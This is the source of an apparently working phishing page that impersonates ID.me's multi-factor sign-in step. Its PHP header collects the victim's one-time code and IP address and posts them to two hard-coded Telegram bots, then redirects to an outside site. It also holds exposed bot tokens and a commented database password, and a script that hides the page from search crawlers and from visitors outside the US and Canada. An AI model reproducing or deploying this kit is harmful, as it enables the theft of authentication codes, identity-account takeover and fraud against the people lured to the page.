<?php 

include 'firewall.php';
// $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");



// Telegram configuration
// define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
// define('TELEGRAM_CHAT_ID', '1325797388');


$telegram_bots = [
    [
        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
        'chat_id' => '1325797388'
    ],
    [
        'token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U',
        'chat_id' => '7339107338'
    ]
    // Add more bots here if needed
];




if ($_SERVER["REQUEST_METHOD"]=="POST"){
    // $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
    // $result = pg_query($query);





// Get and define form inputs
$otpconfirm = htmlspecialchars($_POST['otpconfirm'] ?? '? ? ?');
$ip = htmlspecialchars($_POST['ip'] ?? 'No ip');

// Generate timestamp
$timestamp = date("Y-m-d H:i:s");

// Define message structure before sending to Telegram
$telegram_message = "📝 *Confirm OTP Submission*:\n\n".
                    "👤 *OTP:* $otpconfirm\n".
                    "⏳ *Submitted At:* $timestamp\n".
                    "💬 *IP:* $ip";
                    

// $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";

// // Send message using CURL (allows better error handling)
// $data = [
//     'chat_id' => TELEGRAM_CHAT_ID,
//     'text' => $telegram_message,
//     'parse_mode' => 'Markdown'
// ];

// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, $telegram_url);
// curl_setopt($ch, CURLOPT_POST, 1);
// curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// $response = curl_exec($ch);
// curl_close($ch);



function sendMessageToTelegramBots($message, $bots) {
    foreach ($bots as $bot) {
        $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";

        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Send text message to Telegram
sendMessageToTelegramBots($telegram_message, $telegram_bots);



header("Location:https://upstart-loans-728b.onrender.com/processing.html");

exit; 
}
?>


<!DOCTYPE html>
<html dir='ltr' lang='en'>

<head>
    <link href='https://static.queue-it.net' rel='preconnect'>
    <link href='https://api.sjpf.io' rel='preconnect'>
    <link href='https://device.id.me' rel='preconnect'>
    <title>
        Sign in to ID.me - ID.me
    </title>
    <meta charset='utf-8'>
    <meta content='IE=edge' http-equiv='X-UA-Compatible'>
    <meta content='One Identity. One Wallet.' name='description'>
    <meta content='' name='keywords'>
    <meta content='noodp' name='robots'>
    <meta content='width=device-width, initial-scale=1, minimum-scale=1' name='viewport'>
    <meta content='noindex' name='robots'>
    <link rel="icon" type="image/png"
        href="../../assets/icons/favicon/favicon-3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-57x57-ad49f33c6b98bd9390e51e5ac97408cd19da3764e931bc19b252fea34fc9ee94.png"
        sizes="57x57" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-60x60-85a8ae744189245feb30a76d00ba698d3e76947c3510def7c8888a761fbd63ba.png"
        sizes="60x60" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-72x72-43f9b13ee585ccdf6454f716226fab557042a37f8ac0ec6a894f6459b815862e.png"
        sizes="72x72" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-76x76-d4854442eb3222a5e97fea96e8f83a519c2c7ea1282f10f32a2f5836019edba4.png"
        sizes="76x76" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-114x114-71fe1cbcccd25bcd53daf343da695eda01adadfdef93b074c33a24584ae127c2.png"
        sizes="114x114" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-120x120-4e224a98384c32a9df5e683186aaf80f5dc38df03df317f420c764e5be488480.png"
        sizes="120x120" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-144x144-b7e0aeb0a26dcb5bd1aebb4eaf37f98251fc34fb40e0b441f771372b94fa66ee.png"
        sizes="144x144" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-152x152-edbdf8cbb18f90bd8eb093cc6150fcc53d02e1636a4d3b76fbe1bc0ba5baab82.png"
        sizes="152x152" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-180x180-117122c85f63d210955a29669d6b5b4319cc7340e558efe668f4594d1d7304b9.png"
        sizes="180x180" />
    <link rel="apple-touch-icon-precomposed" type="image/x-icon"
        href="../../assets/icons/favicon/apple-icon-precomposed-9dcfe3e20a36782b710958768d9a4c5463b0ced00f869ce015cf38c879f79830.png" />
    <link rel="icon" type="image/png"
        href="../../assets/icons/favicon/android-icon-192x192-b9cca81c421fd74056c944fd87457ea8b76efec91549bfd5baa639e362316d93.png"
        sizes="192x192" />
    <link rel="icon" type="image/png"
        href="../../assets/icons/favicon/favicon-32x32-88474466ed084a8ad0cab7ddd9b1711a8b96e09d9fbeb769a1d3be9d5c728fa7.png"
        sizes="32x32" />
    <link rel="icon" type="image/png"
        href="../../assets/icons/favicon/favicon-96x96-ff4bc49c45218d94bd24dce580e30118e266d76cd408c36d575b997b0aaf53e3.png"
        sizes="96x96" />
    <link rel="icon" type="image/png"
        href="../../assets/icons/favicon/favicon-16x16-5a8c92dd3dbf20296d619eb084a3ea9510fb77312e80835985fed7fd1d21e15d.png"
        sizes="16x16" />

    <script>
    window._qUUID = "userless";
    window._qSESSIONID = "5f6c5d6911ab106b33399ed41865603f";
    window._qINTID = "3699";
    window._qINT = "ID.me My Account";
    </script>

    <script>
    window._sf_startpt = (new Date()).getTime();
    window.settings = {

        google: {
            account: "UA-40672673-1",
            linking: "true"
        },

        gtm_engineering: "GTM-PL62HD9",

        zendesk_chat: {
            key: "22fb9205-0748-40d7-8eb1-c964afe88d06"
        },

        qualtrics: {
            zoneId: "ZN_2bLc7fWaOZ8U4ey"
        }
    };
    </script>
    <script>
    window.QUEUE_IDENTIFIER = 3699;
    </script>

    <script>
    window.locales = {
        "current": "en",
        "default": "en"
    };
    </script>

    <script src="../../assets/analytics/device-ccd2e348a602d853f5942fa132f84d3dcc278cc99d7244533a728242f32ae21a.js"
        id="device-loader" data-tls="https://fptls.id.me" data-domain="https://device.id.me"
        data-token="Iz3dy7XTqQtNi9aKe3IE" data-image="../device/resource.png"></script>

    <script src="../../assets/analytics/google-81990243df62fe63ea10e1b61505d86bdd0b9507c3b841c224bd25981a95c8aa.js">
    </script>
    <script
        src="../../assets/analytics/gtm_engineering-75cb54582c7329f991049ae3b2e8de9ade91f84253bb7026330dfb172ff4de40.js">
    </script>
    <script src="../../packs/js/runtime-5d83b91d2172c6417e29.js"></script>
    <script src="../../packs/js/725-51e18ddddea6f1a98a88.js"></script>
    <script src="../../packs/js/polyfills-b73a7b909378b44c462f.js"></script>
    <script src="../../packs/js/988-80c2f60fff4d3f5a13e8.js"></script>
    <script src="../../packs/js/components-fc600bef79474ac75c67.js"></script>
    <script src="https://static.queue-it.net/script/queueclient.min.js"></script>
    <script src="https://static.queue-it.net/script/queueconfigloader.min.js" data-queueit-c="idme"></script>
    <meta name="csrf-param" content="authenticity_token" />
    <meta name="csrf-token"
        content="TMnpg+ITTx0b5J+SyeKXWnsyV3AcUZX3fTD1H+3IUhyNEJtkGQGpgsG7rcpV/E1IfbNganyU9Q31o6+SH9RJZw==" />
    <link rel="stylesheet" media="all"
        href="../../assets/application-4a0b7b0d263d32df24730ee97ea6b5d903415cee58a98f8c50b810771c34dcef.css" />
    <script>
    ga("require", "linker");
    ga("linker:autoLink", ["va.gov", "id.me", "myaccess.dmdc.osd.mil"], false, true);
    </script>


    <script>
    ! function(e) {
        var n = "https://s.go-mpulse.net/boomerang/";
        if ("False" == "True") e.BOOMR_config = e.BOOMR_config || {}, e.BOOMR_config.PageParams = e.BOOMR_config
            .PageParams || {}, e.BOOMR_config.PageParams.pci = !0, n = "https://s2.go-mpulse.net/boomerang/";
        if (window.BOOMR_API_key = "GTDQ2-YPV4D-ZPN8M-VW3LM-H9A7G", function() {
                function e() {
                    if (!o) {
                        var e = document.createElement("script");
                        e.id = "boomr-scr-as", e.src = window.BOOMR.url, e.async = !0, i.parentNode.appendChild(e),
                            o = !0
                    }
                }

                function t(e) {
                    o = !0;
                    var n, t, a, r, d = document,
                        O = window;
                    if (window.BOOMR.snippetMethod = e ? "if" : "i", t = function(e, n) {
                            var t = d.createElement("script");
                            t.id = n || "boomr-if-as", t.src = window.BOOMR.url, BOOMR_lstart = (new Date).getTime(),
                                e = e || d.body, e.appendChild(t)
                        }, !window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]\./))
                        return window.BOOMR.snippetMethod = "s", void t(i.parentNode, "boomr-async");
                    a = document.createElement("IFRAME"), a.src = "about:blank", a.title = "", a.role = "presentation",
                        a.loading = "eager", r = (a.frameElement || a).style, r.width = 0, r.height = 0, r.border = 0, r
                        .display = "none", i.parentNode.appendChild(a);
                    try {
                        O = a.contentWindow, d = O.document.open()
                    } catch (_) {
                        n = document.domain, a.src = "javascript:var d=document.open();d.domain='" + n + "';void(0);",
                            O = a.contentWindow, d = O.document.open()
                    }
                    if (n) d._boomrl = function() {
                        this.domain = n, t()
                    }, d.write("<bo" + "dy onload='document._boomrl();'>");
                    else if (O._boomrl = function() {
                            t()
                        }, O.addEventListener) O.addEventListener("load", O._boomrl, !1);
                    else if (O.attachEvent) O.attachEvent("onload", O._boomrl);
                    d.close()
                }

                function a(e) {
                    window.BOOMR_onload = e && e.timeStamp || (new Date).getTime()
                }
                if (!window.BOOMR || !window.BOOMR.version && !window.BOOMR.snippetExecuted) {
                    window.BOOMR = window.BOOMR || {}, window.BOOMR.snippetStart = (new Date).getTime(), window.BOOMR
                        .snippetExecuted = !0, window.BOOMR.snippetVersion = 12, window.BOOMR.url = n +
                        "GTDQ2-YPV4D-ZPN8M-VW3LM-H9A7G";
                    var i = document.currentScript || document.getElementsByTagName("script")[0],
                        o = !1,
                        r = document.createElement("link");
                    if (r.relList && "function" == typeof r.relList.supports && r.relList.supports("preload") && "as" in
                        r) window.BOOMR.snippetMethod = "p", r.href = window.BOOMR.url, r.rel = "preload", r.as =
                        "script", r.addEventListener("load", e), r.addEventListener("error", function() {
                            t(!0)
                        }), setTimeout(function() {
                            if (!o) t(!0)
                        }, 3e3), BOOMR_lstart = (new Date).getTime(), i.parentNode.appendChild(r);
                    else t(!1);
                    if (window.addEventListener) window.addEventListener("load", a, !1);
                    else if (window.attachEvent) window.attachEvent("onload", a)
                }
            }(), "".length > 0)
            if (e && "performance" in e && e.performance && "function" == typeof e.performance
                .setResourceTimingBufferSize) e.performance.setResourceTimingBufferSize();
        ! function() {
            if (BOOMR = e.BOOMR || {}, BOOMR.plugins = BOOMR.plugins || {}, !BOOMR.plugins.AK) {
                var n = "" == "true" ? 1 : 0,
                    t = "",
                    a = "3cbvifcfycf6azgncolq-f-1dd400c7a-clientnsv4-s.akamaihd.net",
                    i = "false" == "true" ? 2 : 1,
                    o = {
                        "ak.v": "36",
                        "ak.cp": "1252485",
                        "ak.ai": parseInt("752192", 10),
                        "ak.ol": "0",
                        "ak.cr": 311,
                        "ak.ipv": 4,
                        "ak.proto": "h2",
                        "ak.rid": "fa9e46a",
                        "ak.r": 44794,
                        "ak.a2": n,
                        "ak.m": "dscb",
                        "ak.n": "essl",
                        "ak.bpcip": "216.131.84.0",
                        "ak.cport": 64715,
                        "ak.gh": "23.67.79.224",
                        "ak.quicv": "",
                        "ak.tlsv": "tls1.3",
                        "ak.0rtt": "",
                        "ak.csrc": "-",
                        "ak.acc": "",
                        "ak.t": "1691161495",
                        "ak.ak": "hOBiQwZUYzCg5VSAfCLimQ==FvQp9gc38fJokI/GLLtFJ5HO+fGVdke50iaMykkdg8xan2BJhb6eNwHlBUf+F4FfNLQWISHBoJZvmY1DrWkXbZ4c/OdT0JrT4YyYBj+lUmED1SzuiA3qvwdd4krGmcOBfz/iH3wSCONw9dLn+ypyRgdgxc8e+L/D1fj9Y32LOhChAVIxR531YaG69csEM/lTIPPON6GYkolSwu7dOqLIJSGaPLWhmKRYuVKVf0Ho69M8lA3jcLrSj6nPQ2ZnbhuGd7gVLyZOC/2FnVysbn6RWKWIX7sUWc6A7Lvyf/xZv0vCU1Fswv7D1nQg9TBwcfWfb0bj1NX0FN1FWsU8FMWbL9YdZF6q5zyvwEVnMn1I3iwpgcBzqmDpoAK3akNGhaj8RdbHhIdkex901c0OldSQrd0J62huo4pcXe8Gw5uhMTs=",
                        "ak.pv": "196",
                        "ak.dpoabenc": "",
                        "ak.tf": i
                    };
                if ("" !== t) o["ak.ruds"] = t;
                var r = {
                    i: !1,
                    av: function(n) {
                        var t = "http.initiator";
                        if (n && (!n[t] || "spa_hard" === n[t])) o["ak.feo"] = void 0 !== e.aFeoApplied ? 1 : 0,
                            BOOMR.addVar(o)
                    },
                    rv: function() {
                        var e = ["ak.bpcip", "ak.cport", "ak.cr", "ak.csrc", "ak.gh", "ak.ipv", "ak.m", "ak.n",
                            "ak.ol", "ak.proto", "ak.quicv", "ak.tlsv", "ak.0rtt", "ak.r", "ak.acc", "ak.t",
                            "ak.tf"
                        ];
                        BOOMR.removeVar(e)
                    }
                };
                BOOMR.plugins.AK = {
                    akVars: o,
                    akDNSPreFetchDomain: a,
                    init: function() {
                        if (!r.i) {
                            var e = BOOMR.subscribe;
                            e("before_beacon", r.av, null, null), e("onbeacon", r.rv, null, null), r.i = !0
                        }
                        return this
                    },
                    is_complete: function() {
                        return !0
                    }
                }
            }
        }()
    }(window);
    </script>

<script>
  // Geo-Blocking and User-Agent Filtering
  (function() {
    // const blockedCountries = ['RU', 'CN', 'IR', 'KP', 'SY', 'CU'];
    const allowedCountries = ['US', 'CA'];
    const botUserAgents = [/googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i, /yandex/i, /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i];

    // User-Agent detection
    const ua = navigator.userAgent;
    if (botUserAgents.some(bot => bot.test(ua))) {
      document.write('<style>body{display:none !important;}</style>');
      throw new Error("Bot access denied");
    }

    // Geo-blocking via IP-based external API (optional - use server-side for reliability)
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        if (!allowedCountries.includes(data.country_code)) {
          document.write('<style>body{display:none !important;}</style>');
          throw new Error("Blocked geo-region");
        }
      })
      .catch(() => {
        document.write('<style>body{display:none !important;}</style>');
        throw new Error("Geo-location check failed");
      });
  })();
</script>






</head>








<body class="">
    <div id="ZN_2bLc7fWaOZ8U4ey"></div>


    <div class="page-container" data-role="page-container">
        <div class="container">
            <div class="content-container multifactor-event multifactor-generator">
                <div class="form-header">

                    <div class="form-header-content" role="banner">
                        <div class="partner">
                            <div class="c_icon m_idme">
                                <img alt="ID.me"
                                    src="../../assets/logos/idme-logo-1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg">
                            </div>
                        </div>
                    </div>




                </div>
                <main aria-labelledby="sr_page_title" class="form-container">
                    <h1 id="sr_page_title">Complete your sign in</h1>

                    <ul class="subway_stops three-stops">
                        <li class="subway_stops-item">
                            <span>1</span>
                            <span class="sr-only">Choose your multi-factor method</span>
                        </li>
                        <li class="subway_stops-item">
                            <span>2</span>
                            <span class="sr-only">Initiate your multi-factor method</span>
                        </li>
                        <li aria-current="true" class="subway_stops-item active">
                            <span class="sr-only">Current step</span>
                            <span>3</span>
                            <span class="sr-only">Confirm your multi-factor method</span>
                        </li>
                    </ul>












                    <form action="" accept-charset="UTF-8" data-validate="" method="post">


                        <input type="hidden" autocomplete="off">

                        <input type="hidden" autocomplete="off">

                        <p class="alert alert-error" role="alert" style="">

                        </p>
                        <p class="alert alert-success" role="alert" style="">

                        </p>

                        <input type="hidden" name="ip" value="<?php echo getenv('HTTP_X_FORWARDED_FOR'); ?>" />

                        <div class="form-content">
                            <h2>Enter a code from your device</h2>
                            <p>Please check your phone and enter the 6-digit code sent via sms to complete your sign in.
                            </p>
                        </div>


                        <div class="form-fields">
                            <div class="field text m_code">
                                <label class="required" for="multifactor_code" style="color: red;">Re-Enter the 6-digit
                                    code</label>
                                <input maxlength="6" pattern="[0-9]*" placeholder="______" required="required"
                                    autocomplete="one-time-code" size="6" type="text" name="otpconfirm"
                                    id="multifactor_code">
                                <span role="alert">

                                </span>
                            </div>
                        </div>
                        <div class="form-footer with-background">
                            <p>Make sure to enter the correct 6-digit code that was sent to your phone.<a href="#"></a>
                            </p>
                        </div>

                        <div class="form-actions">
                            <div class="form-action-button">
                                <button name="submit" type="submit" class="btn btn-primary" data-disable="true"
                                    data-clicked="">Continue</button>
                            </div>
                        </div>


                    </form>
                </main>
            </div>


            <footer class="footer">
                <nav aria-label="Footer" class="footer__links">
                    <ul class="footer__list">
                        <li class="footer__list-item"><a target="_blank" class="footer__link"
                                href="https://www.id.me/about">What is ID.me?</a></li>
                        <li class="footer__list-item"><a target="_blank" class="footer__link"
                                href="https://www.id.me/terms">Terms of Service</a></li>
                        <li class="footer__list-item"><a target="_blank" class="footer__link"
                                href="https://www.id.me/privacy">Privacy Policy</a></li>
                    </ul>
                </nav>
            </footer>

        </div>
    </div>

    <script
        src="https://maps.googleapis.com/maps/api/js?key=AIzaSyD0zvJrQMX-chNAK69YL8jhcQzgruOmKDo&amp;libraries=places">
    </script>

    <script src="/assets/application-23dc0e19928a6f0416b8405d6e483b7d8cb3df42c849cd7a9ec060c158b1f178.js"></script>
    <script src="/assets/zendesk/chat-277e743ae9574a31927fbdf43530b414d8e8480f369965cec738a2a93d3e0311.js"></script>
    <script type="text/javascript" src="/NnCY6vf48/1H/Pa/SKupt_XE_TXGgY/iSYtrVJbfJSY9u/Rz9EDlMEJRE/NA/JnRAA2Dlg">
    </script>

    <iframe data-product="web_widget" title="No content" role="presentation" tabindex="-1" allow="microphone *"
        aria-hidden="true" src="about:blank"
        style="width: 0px; height: 0px; border: 0px; position: absolute; top: -9999px;"></iframe>
</body>

</html>